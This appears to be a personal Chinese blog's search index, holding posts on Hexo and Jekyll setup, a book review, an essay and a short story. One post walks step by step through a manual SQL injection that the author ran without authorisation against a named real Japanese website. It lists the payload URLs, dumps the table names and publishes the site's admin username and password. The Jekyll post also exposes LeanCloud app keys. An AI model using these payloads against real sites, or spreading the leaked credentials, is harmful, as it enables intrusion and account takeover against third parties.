@@ -1,0 +1,173 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>时间管理法则</title>
+      <link href="/2018/11/11/time-management-rule/"/>
+      <url>/2018/11/11/time-management-rule/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2018/11/11/5be726b8beff7.png" alt="time-management-rule.png"><br><!--less--><br><a href="http://naotu.baidu.com/file/6f509806327e98c616c9695265f019cb?token=2d94700ba0c2619d" target="_blank" rel="noopener">思维导图链接</a></p><blockquote><p>思维导图正在更新中，测试 hexo 本地插入图片和视频</p></blockquote><p>【TED 演讲】定下的目标怎样才能实现</p><p><iframe width="850" height="500" src="//player.bilibili.com/player.html?aid=33948843&cid=59453771&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"><br></iframe><br>插入视频的代码分享一下（视频网站一般都有分享按钮，点击一下有 html 代码 copy 一下，然后粘贴到你需要显示的文档里）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">width</span>=<span class="string">"850"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">"500"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">"//player.bilibili.com/player.html?aid=33948843&amp;cid=59453771&amp;page=1"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">frameborder</span>=<span class="string">"no"</span> <span class="attr">framespacing</span>=<span class="string">"0"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">allowfullscreen</span>=<span class="string">"true"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>顺便测试两个小插件 <a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 生短 url 和  <a href="https://github.com/fuchen/hexo-less" target="_blank" rel="noopener">hexo-less</a>  博客首页显示封面，内容不显示</p></blockquote><p>Hexo 默认生成的链接太长了，变短一点可以使用 <a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件。</p><p>使用方法也很简单：</p><ol><li>在 Hexo 博客根目录，执行 <code>npm install hexo-abbrlink --save</code> </li><li>在 <code>_config.yml</code> 配置文件写入</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># abbrlink config</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line"><span class="attr">  alg:</span> <span class="string">crc16</span> <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line"><span class="attr">  rep:</span> <span class="string">hex</span>    <span class="comment">#support dec(default) and hex</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改 permalink 值</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">p/:abbrlink.html</span></span><br></pre></td></tr></table></figure><p>让这篇文章在主页列表中，只显示一张图片，使用 <a href="https://github.com/fuchen/hexo-less" target="_blank" rel="noopener">hexo-less</a> 插件。</p><p>使用方法就是在 Markdown 文件首部插入文章封面，然后下一行插入  <!--less--></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">时间管理法则</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2018</span><span class="bullet">-11</span><span class="bullet">-11</span> <span class="number">01</span><span class="string">:53:55</span></span><br><span class="line"><span class="attr">categories:</span> <span class="string">GTD</span></span><br><span class="line"><span class="attr">tags:</span> </span><br><span class="line"><span class="bullet">-</span> <span class="string">时间管理</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">思维导图</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="string">![封面](http://xxxxx.jpeg)</span>  </span><br><span class="line"><span class="string">&lt;!--less--&gt;</span> </span><br><span class="line"><span class="string">这部分为</span> <span class="string">Content.....</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> GTD </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 时间管理 </tag>
+            
+            <tag> 思维导图 </tag>
+            
+            <tag> hexo插件 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Jekyll博客添加Valine评论</title>
+      <link href="/2018/10/31/2018-10-31-jekyll-bolg-add-valine/"/>
+      <url>/2018/10/31/2018-10-31-jekyll-bolg-add-valine/</url>
+      
+        <content type="html"><![CDATA[<p>关于github搭建jekyl博客，在这里不做过多描述，详情参考：</p><ol><li>百度搜索关键字：<a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=0&amp;rsv_idx=1&amp;tn=baidu&amp;wd=github%E6%90%AD%E5%BB%BAjekyll%E5%8D%9A%E5%AE%A2&amp;rsv_pq=cecac38b0002878a&amp;rsv_t=362evSQHeS%2BnOn3iYGtNoUoaipbPHcEtIUUj%2BJ%2BgGxQVIN0EqkFglRaw0Eo&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_sug3=2&amp;rsv_sug1=1&amp;rsv_sug7=001" target="_blank" rel="noopener">github搭建jekyll博客</a></li><li>官网：<a href="https://www.jekyll.com.cn" target="_blank" rel="noopener">https://www.jekyll.com.cn</a></li></ol><blockquote><p>我的博客用的模板是：<a href="https://github.com/Simpleyyt/jekyll-theme-next" target="_blank" rel="noopener">jekyll-theme-next</a>，本篇文章就是基于这个模板添加的。</p></blockquote><p>关于评论插件：</p><ol><li>Disqus:  需要翻墙</li><li>网易云评论：需要自己的域名</li><li>Duoshuo:  挂了</li><li>gitment：逼格太高</li></ol><p>其他评论插件没有用过，最后发现了Valine，一款快速、简洁且高效的无后端评论系统。<br>详情请访问官网：<a href="https://valine.js.org" target="_blank" rel="noopener">https://valine.js.org</a><br>这个评论系统是基于LeanCloud的，对Jekyll的博客是支持的，官网网址：<a href="https://leancloud.cn" target="_blank" rel="noopener">https://leancloud.cn</a><br><a id="more"></a></p><h3 id="获取-APP-ID-和-APP-KEY"><a href="#获取-APP-ID-和-APP-KEY" class="headerlink" title="获取 APP ID 和 APP KEY"></a>获取 APP ID 和 APP KEY</h3><ol><li><a href="https://leancloud.cn/dashboard/login.html#/signup" target="_blank" rel="noopener">点击这里登录或注册Leancloud</a></li><li><a href="https://leancloud.cn/dashboard/applist.html#/newapp" target="_blank" rel="noopener">点这里创建应用</a>，应用名看个人喜好。</li></ol><p><img src="https://i.loli.net/2018/10/31/5bd88b06152c9.png" alt="clip_image001-1540916462501.png"></p><ol start="3"><li>选择刚刚创建的应用&gt;设置&gt;选择应用      Key，然后你就能看到你的APP ID和APP KEY了，参考下图：</li></ol><p><img src="https://i.loli.net/2018/10/31/5bd88b06dfe82.png" alt="clip_image002.png"></p><ol start="4"><li>为了您的数据安全，请填写应用&gt;设置&gt;安全设置中的Web      安全域名，如下图：</li></ol><p><img src="https://i.loli.net/2018/10/31/5bd88b071ec1f.png" alt="clip_image003-1540916462503.png"></p><h3 id="在博客里DIY评论系统valin页面"><a href="#在博客里DIY评论系统valin页面" class="headerlink" title="在博客里DIY评论系统valin页面"></a>在博客里DIY评论系统valin页面</h3><h4 id="创建valine-html"><a href="#创建valine-html" class="headerlink" title="创建valine.html"></a>创建valine.html</h4><p>在 _includes_third-party\comments里面添加一个文件valine.html<br>在文件里添加代码：</p><p><img src="https://i.loli.net/2018/10/31/5bd8a3eeab05e.png" alt="QQ图片20181031023246.png"><br>在这几行代码做了注释，主要是为了在博客配置文件中_config.yml添加相关变量的取值。</p><h4 id="修改-config-ym配置"><a href="#修改-config-ym配置" class="headerlink" title="修改_config.ym配置"></a>修改_config.ym配置</h4><p>在_config.yml添加变量app_id，app_key， placeholde的值，关于取值传递到valine.html，是通过构建jekyll变量，具体代码如下：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">valine_comment:</span></span><br><span class="line">  <span class="symbol">enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># app_id</span></span><br><span class="line">  <span class="symbol">leancloud_appid:</span> knEe7Rc6frt1ygf3gAwBTbnB-gzGzoHsz</span><br><span class="line"><span class="comment"># app_key</span></span><br><span class="line">  <span class="symbol">leancloud_appkey:</span> <span class="number">2</span>yxyYCewv3lUoTOpl77PT0QX</span><br><span class="line"><span class="comment"># placeholde</span></span><br><span class="line">  <span class="symbol">placeholder:</span> “Just go go<span class="string">"</span></span><br></pre></td></tr></table></figure></p><h4 id="调用valine-html"><a href="#调用valine-html" class="headerlink" title="调用valine.html"></a>调用valine.html</h4><p>由于前面创建了valine.htm，需要jekyll博客能够运行这个页面的代码，使评论框显示在每篇文章的页面，需要在_includes_third-party\comments\index.html里面添加代码：<br><img src="https://i.loli.net/2018/10/31/5bd89ca0e4cc8.png" alt="1.png"><br>在_includes/_partials/comments.html里面插入代码：<br><img src="https://i.loli.net/2018/10/31/5bd89ca124ba2.png" alt="2.png"><br>（由于上面图中所示代码会jekyll博客发文章时会运行，从而破坏文章内容，改为图片了，如果需要代码请联系我。）</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li>本篇文章只具有参考意义，有什么不明白的可以在jekyll和valine查找相关内容</li><li>需要对自己的博客构架了解后，自行DIY</li><li>效果请点击：<a href="https://wildgrass.top" target="_blank" rel="noopener">进击的野草</a> 中任何一篇文章，查看最下方评论框 </li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 博客技术 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> jekyll </tag>
+            
+            <tag> github </tag>
+            
+            <tag> valine </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《周鸿祎自述：我的互联网方法论》读后感</title>
+      <link href="/2016/09/12/%E3%80%8A%E5%91%A8%E9%B8%BF%E7%A5%8E%E8%87%AA%E8%BF%B0%EF%BC%9A%E6%88%91%E7%9A%84%E4%BA%92%E8%81%94%E7%BD%91%E6%96%B9%E6%B3%95%E8%AE%BA%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F/"/>
+      <url>/2016/09/12/%E3%80%8A%E5%91%A8%E9%B8%BF%E7%A5%8E%E8%87%AA%E8%BF%B0%EF%BC%9A%E6%88%91%E7%9A%84%E4%BA%92%E8%81%94%E7%BD%91%E6%96%B9%E6%B3%95%E8%AE%BA%E3%80%8B%E8%AF%BB%E5%90%8E%E6%84%9F/</url>
+      
+        <content type="html"><![CDATA[<p>最近，看到微博上推崇了一本书《周鸿祎自述：我的互联网方法论》。我对这本书的名字很感兴趣，愉快地下载了一本，用kindle开始粗糙的看了几页。谁知道一下看上瘾了，在闲暇时光，把这本书通读了一遍。<br><a id="more"></a></p><h2 id="感言："><a href="#感言：" class="headerlink" title="感言："></a>感言：</h2><p>我对周鸿祎向来都是通过社交网络来了解的，总认为他是个比较“流弊”的人。看完这本书，改变了我对他的看法。我知道没有资格评论他人，但是我想说：他是一个追求极致的产品控，对产品用户很负责的人。他经过实践经验的积累和对其他公司思考，陈述了他的互联网方法论。360通过不断的微创新打磨产品，锻炼出一个又一个杰出的创业小团伙。360见证互联网时代产品发展的趋势，颠覆了传统杀毒商业模式。</p><p>在下是一名小屌丝，对互联网创业方面没有过多的关注。对这本书感触最深的就是关于免费商业模式、产品体验、用户至上、微创新的内容。良好的产品体验，会使用户对产品产生依赖。产品用户量的大小，能体现出产品体验是怎么样的。从广大用户角度对产品功能需求出发，做微创新打磨产品，能使产品具有特有的亮点，才能超越竞争对手。有了庞大的用户量，能够使产品成本趋向免费，通过增值业务或者其他来盈利。</p><h2 id="摘录内容："><a href="#摘录内容：" class="headerlink" title="摘录内容："></a>摘录内容：</h2><h3 id="核心是产品体验"><a href="#核心是产品体验" class="headerlink" title="核心是产品体验"></a>核心是产品体验</h3><p>产品之道，大同小异。只要你是做消费类产品的，是直接面向消费者的，而把产品做得简单易用，用户就喜欢。无论是虚拟的互联网服务，还是现实世界的服务，或者实体的产品，都存在着大量可以改善用户体验的机会。而你一旦着手去改善用户体验，那就意味着创新的开始。</p><h3 id="商业模式不是赚钱模式"><a href="#商业模式不是赚钱模式" class="headerlink" title="商业模式不是赚钱模式"></a>商业模式不是赚钱模式</h3><p>（1）商业模式的基础是用户，没有用户，任何商业模式都是浮云。他们不知道一个商业模式的核心是产品，本质是通过产品为用户创造价值。商业模式还包含寻找需求最强烈的用户群，用聪明的推广方法接触这些用户，在接触过程中不断把产品打磨好，等你有了巨大的用户基础，是一定能赚到钱的。</p><p>（2）什么是商业模式呢？其实，商业模式不是赚钱模式。它至少包含了四个方面内容：产品模式，用户模式，推广模式，最后才是收入模式，即如何赚钱。真正的推广模式要根据你用户群和产品，去设计相应的推广方法。</p><h3 id="互联网产品的本质是为用户服务"><a href="#互联网产品的本质是为用户服务" class="headerlink" title="互联网产品的本质是为用户服务"></a>互联网产品的本质是为用户服务</h3><p>（1）不要期望某个版本带来革命，而是靠很多小版本来实现革命。就是说，并不是在一开始就策划一个庞大的技术体系，而是从一个点开始切入，甚至是做一些比较简陋的原型，或比较粗糙的第一个版本，最重要的是尽快发布、争取用户，在得到市场的验证和指点之后，再进行调整。不要怕有时候重做产品，或者将来再改进产品。</p><p>（2）技术开发方面采用小步快跑、循序渐进、不断试错的思路，集小胜为大胜，通过点点滴滴的进展，反而超过大公司。</p><p>什么是微创新</p><p>微创新两个关键点：（1）从小处着眼，贴近用户需求心理：（2）小步快跑，快速出击，不断试错。</p><p>互联网讲究的是用最低的成本、最小的规模、最快的速度去尝试一个粗糙的东西，快速拿到市场上去试，市场好就趁热打铁，乘胜追击，不好就赶快换方向。</p><h2 id="引发思考的问题："><a href="#引发思考的问题：" class="headerlink" title="引发思考的问题："></a>引发思考的问题：</h2><p>   “用户为什么非要用这款产品？这款产品能为用户解决什么问题？这款产品与竞争对手的产品到底有哪些不同”</p><p>  “什么是商业模式？包括产品模式、用户模式、推广模式，最后才是收入模式”。</p><h2 id="乔布斯的话："><a href="#乔布斯的话：" class="headerlink" title="乔布斯的话："></a>乔布斯的话：</h2><p>“好的艺术家懂得复制，伟大的艺术家则擅长偷窃。”</p><p>“Stay hugry,stay foolish”（求知若饥，虚心若谷）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 读书笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 心情随笔 </tag>
+            
+            <tag> 读后感 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>离别心语</title>
+      <link href="/2015/01/13/2015-01-13-parting-heart/"/>
+      <url>/2015/01/13/2015-01-13-parting-heart/</url>
+      
+        <content type="html"><![CDATA[<p>时间流逝，万物轮回。知耻而后勇，勇往直前。<br><a id="more"></a><br>夜幕降临，我从睡梦中醒来。昏昏沉沉打开眼皮，坐在床上，舒展一下松散的身体。独站阳台，举目眺望。天地相接的地方镶嵌着淡橘色，万籁空寂，微风阵阵。</p><p>一种莫名的孤独感，袭上心头，内心防御系统瞬间瓦解。我无力抵抗，只好敲打文字，来填补内心空虚。人生如戏，扮演着属于自己的角色。命运无法掌控，已经被写好的剧本所控。是不是入戏太深，无法分辨自己与角色的差别？于是，戏与人生没有差别。</p><p>年底，我辞掉了工作，回家的路途中，遇到了不小的波折，尤其是在合肥火车站。这件事情，在我的整个生命里，涂上了浓重的黑笔。关于这件事，就不必宣扬了。佛说：因果报应，如影相随。心灵沉睡的巨人敲响了警钟。<br><img src="https://i.loli.net/2018/10/30/5bd8652641334.jpg" alt="timg.jpg"><br>伴随着快乐步伐，走进家的大门，此年已经接近了尾声。在家人的无微不至的照料下，在亲朋好友的祝福中，在远在他乡的游子呐喊里，让我不经意间感受到了苍天之爱。亲爱的，请允许我为你向上苍祈福。</p><p>每次，看见你搂着宝宝睡觉；每次，看见你的微笑；每次，听到你的责骂；每次，得到你的鼓励。正是这每次，使我看见人性的光辉之处，让我在黑暗里看到了曙光。让我深深的记住这每次，让其在我的脑海里徘徊，让其点缀装饰我的人生。</p><p>相聚总是短暂，长久的离别就是为了这短暂的相逢。我再次看看家人的脸，再次听闻家人的嘱咐，再次依依不舍转身，又再次扛起了担子，迈开魔鬼的步伐，向着城市出发，开始了我的务工生涯。</p><p>不知道这样的日子何时是尽头，我又将何去何从，如同风中的沙粒飘渺不定，无人知晓。将来我已经不期待了，就这样平淡的一天又一天过去。心中再无伤痛，我将继续艰辛的生活下去。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 心情随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 杂文 </tag>
+            
+            <tag> 心情随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MYSQL手工注入某日本网站</title>
+      <link href="/2013/10/09/2013-10-09-manual-mysql-injection/"/>
+      <url>/2013/10/09/2013-10-09-manual-mysql-injection/</url>
+      
+        <content type="html"><![CDATA[<p>经过一天的辛苦劳动下班了，实在无聊，QQ上的基友基本都挂机睡觉了。找点乐子打发时间，看了一下2013年OWASP Top Ten Project， Injection排在第一。去了解注入，还是有必要的。随便google了几个日本网站，发现不少都在注入点，有很多用手工都比较鸡肋，终于找到了一个比较满意的。<br><a id="more"></a></p><h3 id="0X01-判断是否为注入点"><a href="#0X01-判断是否为注入点" class="headerlink" title="0X01 判断是否为注入点"></a>0X01 判断是否为注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.php?nid=162’ /*报错，显示MDB2 Error: syntax error*/</span><br><span class="line">http://henecia.jp/news/detail.php?nid=162+and+1=1 /*显示正常*/</span><br><span class="line">http://henecia.jp/news/detail.php?nid=162+and+1=2 /*显示异常*/</span><br></pre></td></tr></table></figure><p>判断是注入点 </p><h3 id="0X02-判断数据库类"><a href="#0X02-判断数据库类" class="headerlink" title="0X02 判断数据库类"></a>0X02 判断数据库类</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.php?nid=162+and+user&gt;0</span><br></pre></td></tr></table></figure><p>报错，显示MDB2 Error: no such field​        </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.php?nid=162+and+version()&gt;0</span><br></pre></td></tr></table></figure><p> 显示正常</p><p>判定是MYSQL数据库</p><h3 id="0x03-猜解当前网页的字段数"><a href="#0x03-猜解当前网页的字段数" class="headerlink" title="0x03 猜解当前网页的字段数"></a>0x03 猜解当前网页的字段数</h3><p>采用二分法，逐渐猜解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.php?nid=162+order+by+9</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d35dfc3.png" alt="clip_image001.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.php?nid=162+order+by+10</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d30eace.png" alt="clip_image003.png"></p><p>Order by 9显示正常 ；order 10 显示不正常。说明字段数为9</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.php?nid=162+and+1=2+union+select+1,2,3,4,5,6,7,8,9 –</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d40da85.png" alt="clip_image004.png"></p><p>爆出出显示位，显示位为2和3。</p><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。URL后面添加 and+1=2 显示有报错信息，URL后面添加 select+1,2,3,4,5,6,7,8,9  显示正常的网页，使用UNION操作符将后者的显示信息覆盖掉前面报错的信息，这样就能清楚看到显示位了。 </p><h3 id="0x04-爆出数据库基本信息"><a href="#0x04-爆出数据库基本信息" class="headerlink" title="0x04 爆出数据库基本信息"></a>0x04 爆出数据库基本信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.phpnid=162+and+1=2+union+select+1,concat(user(),0x20,database(),0x20,version()),3,4,5,6,7,8,9 –</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d5447b1.png" alt="clip_image006.png"></p><p>用户：henecia@localhost ，数据库名：henecia，数据库版本：5.1.56<br>可以在显位的位置插入的预设函数：</p><blockquote><p>User() 查看用户<br>database()  –查看数据库名称<br>Version() –查看数据库版本<br>@@datadir –数据库路径<br>@@version_compile_os –操作系统版本<br>system_user() –系统用户名<br>current_user() –当前用户名<br>session_user()–连接数据库的用户名</p></blockquote><p>为了显示信息更方便，这里在构造sql查询语句中使用了concat函数，它连接一个或者多个字符串, 有任何一个参数为NULL ，则返回值为 NULL。还有group_concat()和concat_ws(),这些函数的功能不清楚，有必要去了解一下，这里我就不多说了。</p><h3 id="0x05-爆出数据库名"><a href="#0x05-爆出数据库名" class="headerlink" title="0x05 爆出数据库名"></a>0x05 爆出数据库名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.phpnid=162+and+1=2+union+select+1,group_concat(distinct+table_schema),3,4,5,6,7,8,9+from+information_schema.columns --</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d594ddf.png" alt="clip_image008.png"></p><p>爆出数据库名：information_schema,henecia</p><p>information_schema数据库是在MYSQL的版本5.0之后产生的，一个虚拟数据库，物理上并不存在。nformation_schema数据库类似与“数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名，列类型，访问权限（更加细化的访问方式）。information_schema是一个由数据库的元数据组成的数据库。里面存储的是MYSQL的数据库基本信息。并随时改变。用于查看信息以及系统决策时作为重要的信息提供者。</p><p>MYSQL的版本5.0以上版本，我们借助information_schema数据库，来获取其他数据库的信息。用到了group_concat()函数，distinct参数起到了去掉重复显示的作用。</p><h3 id="0x06-爆出当前数据库的表名"><a href="#0x06-爆出当前数据库的表名" class="headerlink" title="0x06 爆出当前数据库的表名"></a>0x06 爆出当前数据库的表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.phpnid=162+and+1=2+union+select+1,group_concat(distinct+table_name),3,4,5,6,7,8,9+from+information_schema.tables+where+table_schema=database() --</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d5a4dbe.png" alt="clip_image010.png"></p><p>显示的表名：</p><blockquote><p>TM_ADMIN_MEMBER,TM_BANNER_MASTER,TM_BBS1_CATEGORY,<br>TM_BBS1_COMMENT,TM_BLOG1_CATEGORY,TM_BLOG1_COMMENT,<br>TM_BLOG1_MASTER,TM_EVENT_ORDER,TM_GOODSNEWS_MASTER,<br>TM_MEMBER_MASTER,TM_MEMBER_MASTER2,TM_NEWS_MASTER,<br>TM_PASS_MASTER,TM_PAYMENT_TRANS_HISTORY,TM_SCHEDULE_CATEGORY,<br>TM_SCHEDULE_MASTER,TM_SITEID,T_RESEND_MEMBER,<br>T_RESEND_MEMBER_CARDFIN  ,T_RESEND</p></blockquote><p>如果数据库表比较多，一般都使用使用limit n,1插到末尾，逐次爆出的数据(n为显示第n个)。</p><h3 id="0x07-爆出表中的字段"><a href="#0x07-爆出表中的字段" class="headerlink" title="0x07 爆出表中的字段"></a>0x07 爆出表中的字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.phpnid=162+and+1=2+union+select+1,group_concat(distinct+column_name),3,4,5,6,7,8,9+from+information_schema.columns+where+table_name=0x544D5F41444D494E5F4D454D424552 --</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d59a3eb.png" alt="clip_image012.png"></p><p>给table_name赋的值为TM_ADMIN_MEMBER的HEX（16进制）。</p><h3 id="0x08-爆出数据库表的数据"><a href="#0x08-爆出数据库表的数据" class="headerlink" title="0x08 爆出数据库表的数据"></a>0x08 爆出数据库表的数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://henecia.jp/news/detail.phpnid=162+and+1=2+union+select+1,group_concat(admin_id,0x2B,login_uid,0x2B,login_pwd),3,4,5,6,7,8,9+from+TM_ADMIN_MEMBER --</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/27/5bd482d5379ce.png" alt="clip_image014.png"></p><p>爆出admin_id为1，login_uid为admin，login_pwd为osuktm12</p><p>文章到此完结,请多指教。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> MYSQL注入 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>月夜</title>
+      <link href="/2008/11/20/2008-11-20-moonlit/"/>
+      <url>/2008/11/20/2008-11-20-moonlit/</url>
+      
+        <content type="html"><![CDATA[<blockquote><p> 用一篇短篇小说回忆当年幼稚、青涩，白驹过隙，再也回不到过去。</p></blockquote><a id="more"></a><p>   <img src="https://i.loli.net/2018/10/25/5bd1dd5b5a66e.jpg" alt="5bd1dd5b5a66e.jpg"></p><h1 id="夜月"><a href="#夜月" class="headerlink" title="夜月"></a>夜月</h1><p>月儿，悬挂在瓦蓝天空，散发出皎洁的光，使万物安详。清风拂过，万籁寂静，心怀坦荡，沉醉飞翔。今夜的月仿佛比平时更美，美的神秘，美的凉，美的让人心碎。 突然，风儿怒吼起来，月儿发出的光变成暗红，天地暗淡无光，透漏着恐怖的气象，天空颤抖了，大地开始荒芜。我独自在桥上，等待着她放学回家。 时间流逝，袅无人烟，不见她的到来。  </p><p>我赶紧跑往山头的家里跑。家里空荡荡，一个鬼影都没，心头开始发凉。天空发出这样的声音：“儿子呀，爸和妈去另一个世界了，你要自己照顾自己了。”桌子上放上了一朵小葵花儿，上面有个字条，写着：“亲爱的，我去另一个世界了，我走了。对不起，我爱你。你一个人要好好活呀！”顿时，我感觉到了鼻尖酸楚，泪珠止不住的在眼眶里打转儿，身心陷入了永无止境的黑暗中。</p><p>我手里捧着那朵小葵花，脑袋一片空白，放佛有一把尖刀深深的插到我的心脏了，使我生不如死。我用最后的力气咆哮：“我去找你们！一定能找到你们！”。奔至悬崖边，我纵身一跃，坠入万丈深渊。 </p><p>天空依旧很蓝，依旧安然，依旧美丽。却不知时间流逝，世界轮回。我睁开双眼，依稀的能看到什么东西，感觉这里很温暖。漫天的蝴蝶飞舞着，花儿轻轻的摇曳着，大地是一遍生机勃勃。我的身体动不了，就连呼吸都很困难，全身伴随着剧痛刺激。仿佛到另个世界了，只是手里的小葵花还在。不知不觉，我已酣然入梦。   </p><p>我醒来了，看到有几双大眼睛盯着我，看的我有点不好意思了，不知道他们嘴里说些什么。突然，大地开始震颤，发出威严的声音：“你是打败月魔的唯一人选。你为了找到你心爱的人，连死亡都忘记了，你万中无一的。”，这时所有人都避开我，对我发出敬畏的目光。到底，怎么回事呀？我心里想着：“我心爱的人们在这里吗？”那个声音回答说：“你要找的那些人只是在你打败月魔的时才出现。你现在是凡人，没有任何力量。我是月神之灵。”刚说完，立即有股神奇的力量注入到我的体内了，在我心里留下一句话：“你还不够强大，希望你强大起来，我把整个月神族的命运交给你了。到时候月魔屠杀我的子民了，你要去保护他们，拯救他们。记住，到时候，有一个人为了激发你灵魂的力量，会在你眼前牺牲的！”。  </p><p>大地开始寂静了，在默默的沉哀。天空变的更蓝，在偷偷的哭泣。它们的悲伤在我眼里，似乎没有意味，因为我根本不了解。他们悲伤关我什么事情呀，我只要打败月魔，就能见到我心爱的人。我眼睛盯着小葵花，似乎当周围的一切都不存在的，一切对我来说没有任何意义。 